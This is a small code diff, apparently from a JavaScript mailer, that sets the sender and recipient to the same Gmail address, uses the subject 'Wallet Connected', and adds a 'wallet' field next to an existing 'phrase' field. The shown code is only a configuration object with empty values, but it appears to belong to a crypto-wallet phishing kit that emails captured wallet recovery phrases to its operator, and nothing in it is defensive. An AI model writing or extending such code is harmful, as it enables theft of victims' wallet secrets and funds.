@@ -14,6 +14,7 @@ let mailOptions = {
     from: 'austinmary624@gmail.com',
     to: 'austinmary624@gmail.com',
     subject: 'Wallet Connected',
+    wallet: '',
     phrase: ''
 };
 
